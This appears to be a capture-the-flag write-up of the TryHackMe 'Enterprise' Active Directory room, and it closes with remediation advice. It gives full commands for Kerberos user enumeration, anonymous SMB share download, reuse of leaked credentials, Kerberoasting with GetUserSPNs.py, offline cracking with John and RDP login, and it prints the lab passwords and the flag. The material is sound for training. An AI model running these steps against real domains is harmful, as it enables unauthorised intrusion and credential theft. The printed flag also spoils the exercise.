# Enterprise (THM) - Active Directory Reconnaissance & Kerberoasting

**Platform:** TryHackMe | **Target OS:** Windows Server (Active Directory) | **Difficulty:** Hard  
**Focus:** Active Directory Enumeration, SMB Data Exfiltration, OSINT (GitHub Credential Leakage), Kerberoasting (TGS Extraction), and RDP Initial Access.

---

## 🎯 Executive Summary
The "Enterprise" machine presents a complex, multi-layered Active Directory environment. The engagement simulates a realistic internal penetration test where initial foothold requires chaining open-source intelligence with internal enumeration. 

The attack path successfully executed during this phase included:
1. **Network & AD Profiling:** Identifying the Domain Controller and extracting a valid user list via Kerberos enumeration.
2. **SMB Exfiltration:** Exploiting anonymous SMB access to recursively download user profiles, recovering PowerShell history files containing leaked (but obsolete) credentials.
3. **OSINT Credential Harvesting:** Leveraging external GitHub repositories belonging to identified domain users to recover hardcoded authentication materials (`nik`).
4. **Kerberoasting (TGS Extraction):** Utilizing the compromised user account to query the Domain Controller for Service Principal Names (SPNs). A Ticket Granting Service (TGS) ticket for the `bitbucket` service account was extracted and cracked offline.
5. **Initial Access:** Achieving an interactive GUI session via Remote Desktop Protocol (RDP) to secure the initial objective (User Flag).

*Note: This report documents the Initial Access and Lateral Movement phases. Full domain escalation (Root/SYSTEM) was deferred for future operational phases.*

---

## 1. Network Reconnaissance & AD Profiling

We initiated the engagement with an aggressive Nmap service scan to map the exposed attack surface of the Domain Controller.

```bash
$ nmap -sV -sC -T4 -o nmap_result 10.128.182.48
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

**Intelligence Analysis:**
The presence of ports 88 (Kerberos), 389 (LDAP), and 53 (DNS) confirms the target is a Domain Controller. The domain name `ENTERPRISE.THM` was extracted from the LDAP banner.

We utilized `kerbrute` to perform stealthy user enumeration against the Kerberos KDC, generating a list of valid domain accounts (e.g., `banana`, `administrator`, `nik`, `spooks`, `joiner`). An initial test for AS-REP Roasting vulnerabilities via `GetNPUsers.py` yielded no results, confirming standard pre-authentication was enforced.

---

## 2. SMB Enumeration & PowerShell History Analysis

Pivoting to the SMB service (Port 445), we identified a custom share named `Users` allowing unauthenticated access. We initiated a recursive download of the entire share contents.

```bash
$ smbclient //10.128.182.48/Users -N -c "prompt OFF; recurse ON; mget *"
```

**Forensic Analysis (`ConsoleHost_history.txt`):**
In modern Windows environments, PowerShell commands are logged to `ConsoleHost_history.txt`. Analyzing the downloaded artifacts revealed a script execution log containing hardcoded credentials:

```text
echo "replication:101RepAdmin123!!">private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
```
*Validation:* We attempted to authenticate against the SMB service using NetExec (`nxc`). However, the server returned `STATUS_LOGON_FAILURE`, indicating the credential was either rotated, disabled, or locked out.

---

## 3. OSINT & Source Code Review

With internal avenues temporarily exhausted, we pivoted to Open Source Intelligence (OSINT). Correlating the enumerated user `nik` with the domain name `Enterprise-THM`, we discovered a public GitHub repository.

**Credential Leakage:**
Reviewing the commit history of a PowerShell management script (`mgmtScript.ps1`) within the repository exposed hardcoded domain credentials:

```powershell
Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = 'ToastyBoi!'
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
```

Authentication was successfully validated against the SMB service using NetExec:
```bash
$ nxc smb 10.128.182.48 -u 'nik' -p 'ToastyBoi!'
[+] LAB.ENTERPRISE.THM\nik:ToastyBoi!
```

---

## 4. Kerberoasting & Offline Cracking

Possessing valid domain credentials, we transitioned to a **Kerberoasting** attack. In Active Directory, Service Principal Names (SPNs) are used to uniquely identify service instances. Any authenticated user can request a TGS (Ticket Granting Service) ticket for an account with an SPN. A portion of this ticket is encrypted with the service account's NTLM hash.

We utilized Impacket's `GetUserSPNs.py` to request and extract the ticket for the `bitbucket` service account:

```bash
$ GetUserSPNs.py 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip 10.128.182.48 -request
ServicePrincipalName  Name       MemberOf 
--------------------  ---------  -----------------------------------------------------------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM

$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$3eba26c08117d9946d...
```

**Offline Cryptanalysis:**
We formatted the extracted TGS ticket and executed a dictionary attack using John the Ripper (`rockyou.txt`):

```bash
$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/kay_hash
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
littleredbucket  (bitbucket)
```

---

## 5. Initial Access via RDP

With the newly cracked credentials (`bitbucket`:`littleredbucket`), we established a GUI-based interactive session utilizing the Remote Desktop Protocol (RDP) on Port 3389.

```bash
$ xfreerdp /u:bitbucket /p:littleredbucket /v:10.129.185.90 /cert:ignore +clipboard /dynamic-resolution
```

Upon successful authentication, the initial user objective flag was recovered from the user's desktop.

```text
THM{ed882d02b34246536ef7da79062bef36}
```

---

## 6. Defensive Remediation & Detection Engineering

1. **Source Code Security (OSINT Prevention):** Developers must strictly avoid hardcoding credentials in scripts. Utilize Azure Key Vault, HashiCorp Vault, or PowerShell SecretManagement modules to securely inject credentials at runtime.
2. **Kerberoasting Mitigation:** Service Accounts (like `bitbucket`) must utilize highly complex, randomly generated passwords exceeding 30 characters. This renders offline dictionary cracking of the TGS ticket computationally infeasible. Alternatively, implement Group Managed Service Accounts (gMSA) which automatically rotate complex passwords.
3. **SMB Hardening:** Disable anonymous access to all network shares. The `Users` share should explicitly require domain authentication, neutralizing the initial PowerShell history leakage.